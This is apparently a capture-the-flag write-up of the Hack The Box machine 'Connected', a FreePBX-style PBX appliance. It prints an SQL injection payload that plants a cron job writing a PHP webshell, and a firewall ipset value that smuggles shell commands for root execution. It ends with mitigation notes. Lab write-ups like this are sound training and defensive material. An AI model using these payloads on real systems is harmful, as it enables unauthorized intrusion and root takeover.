# HTB: Connected

| Info | Detail |
|------|--------|
| OS | Linux (Sangoma Linux 7 / CentOS-like PBX appliance) |
| Difficulty | Easy |
| IP | 10.129.88.2 |
| Date | 2026-08-14 |
| Status | ✅ Rooted |
| Initial surface | 22/tcp SSH, 80/tcp HTTP, 443/tcp HTTPS |

## Attack Chain

```text
Recon → connected.htb / pbxconnect FreePBX-style PBX appliance
→ unauthenticated FreePBX endpoint ajax SQL injection
→ insert enabled cron_jobs row that writes a PHP webshell
→ code execution as asterisk
→ read /home/asterisk/user.txt
→ enumerate Sysadmin/Firewall root hooks and writable incron spool
→ write compressed firewall.updateipset payload with shell metacharacters
→ root-run firewall hook command injection
→ SUID bash proof as root → read /root/root.txt
```

---

## Reconnaissance

### Port Scan

```text
22/tcp  open  ssh        OpenSSH 7.4
80/tcp  open  http       Apache httpd 2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
443/tcp open  ssl/https  certificate CN=pbxconnect
```

HTTP redirected to the lab hostname:

```text
HTTP/1.1 302 Found
Location: /admin
```

Local host mapping used during enumeration:

```text
10.129.88.2 connected.htb pbxconnect
```

Additional PBX-adjacent ports such as SIP/AMI/alternate web panels were either filtered or not externally reachable from the VPN vantage point.

---

## Web Enumeration

The exposed application behaved like a Sangoma/FreePBX PBXConnect appliance:

- Apache/PHP front end on :80.
- `/admin` FreePBX-style admin surface.
- `/admin/ajax.php` reachable pre-auth for selected module ajax handlers.
- Several API-style endpoints correctly returned `401 Not Authenticated`.

Searchsploit showed a relevant family of FreePBX authenticated and pre-auth RCE/SQLi issues, including FreePBX 16 RCE references. The working path here was not a direct copy-paste exploit; it was a focused abuse of the unauthenticated endpoint ajax path to persist a cron job command.

---

## Foothold — Endpoint Ajax SQL Injection to Cron Job RCE

The foothold came from the endpoint module ajax route:

```text
/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=<payload>
```

The `brand` parameter was injectable into a database-backed model path. A controlled SQL payload inserted a new enabled row into `cron_jobs`, with the command set to write a tiny PHP command wrapper into the web root.

Payload shape, with the random names and shell body generalized:

```text
x'; INSERT INTO cron_jobs
  (modulename, jobname, command, class, schedule, max_runtime, enabled, execution_order)
VALUES
  ('sysadmin', '<random-job>', 'echo <base64-php> | base64 -d > /var/www/html/<random>.php', NULL, '* * * * *', 30, 1, 1) --
```

After the scheduler ran, the webshell executed as the PBX service account:

```text
uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
```

---

## User

The `asterisk` service account had group read access to the user flag:

```text
-rw-r----- 1 root asterisk 33 /home/asterisk/user.txt
```

User flag was captured and validated. The public writeup intentionally omits the flag value.

---

## Privilege Escalation Enumeration

Local enumeration identified the appliance profile and useful PBX internals:

```text
Linux connected 5.4.239-1.el7.elrepo.x86_64
PRETTY_NAME="Sangoma Linux 7 (Core)"
```

Interesting local services were bound to localhost, including MySQL, Redis, Asterisk AMI, MongoDB, and an internal service on 127.0.0.1:4000. Standard sudo was unavailable from the webshell context:

```text
sudo: no tty present and no askpass program specified
```

The decisive path was the Sangoma/FreePBX Sysadmin/Firewall integration. The `asterisk` context could write under the Asterisk incron spool, and Sysadmin firewall hooks processed encoded update files as root.

The vulnerable pattern:

1. Write an encoded update payload into the Asterisk incron spool.
2. The root-side Sysadmin manager consumes the update file.
3. The firewall `updateipset` logic expands attacker-controlled fields into shell commands without sufficient quoting.

Trigger file used:

```text
/var/spool/asterisk/incron/firewall.updateipset.CONTENTS
```

The payload format was compressed JSON, base64 encoded, with `/` replaced by `_`, matching the appliance hook format.

---

## Root — Firewall Updateipset Command Injection

A minimal proof payload placed shell metacharacters in the firewall `ipset` field:

```python
settings = {
    "action": "flush",
    "ipset": "x; /usr/bin/id > /tmp/fwrootid; /bin/sleep 20 #"
}
```

That confirmed root execution. The final proof copied `/bin/bash` to a controlled location, made it SUID root, and used it only to verify identity and read the root flag:

```text
uid=0(root) gid=0(root) groups=0(root)
uid=999(asterisk) gid=1000(asterisk) euid=0(root) groups=1000(asterisk)
```

Root flag was captured and validated. The public writeup intentionally omits the flag value.

---

## Cleanup Notes

Temporary web and root-proof artifacts were tracked in the operator notes. One final automated cleanup command was blocked locally because it would overwrite target system configuration, so cleanup state should be treated as partially completed rather than silently assumed complete.

For a real engagement, the cleanup/remediation plan would include:

- Remove the injected `cron_jobs` entry.
- Remove the temporary PHP command wrapper.
- Remove any root proof/SUID artifacts.
- Restore modified PBX/Sysadmin/Firewall configuration from known-good backups.
- Restart only the affected services after validating syntax.

---

## Lessons Learned / Mitigation

- Do not expose module ajax handlers that can reach database-backed model operations before authentication.
- Treat PBX scheduler rows as code-execution sinks; validate and audit who can create or modify them.
- Root-run appliance hooks must never interpolate decoded JSON fields into shell commands. Use argument arrays or strict allowlists.
- Incron spool directories are privilege-boundary surfaces. If a low-privilege service account can write trigger files that root consumes, each consumer must be designed as hostile-input parsing code.
- PBX appliances often contain many privileged helper paths; after foothold, enumerate vendor modules and root-run maintenance hooks before chasing generic kernel/SUID exploits.
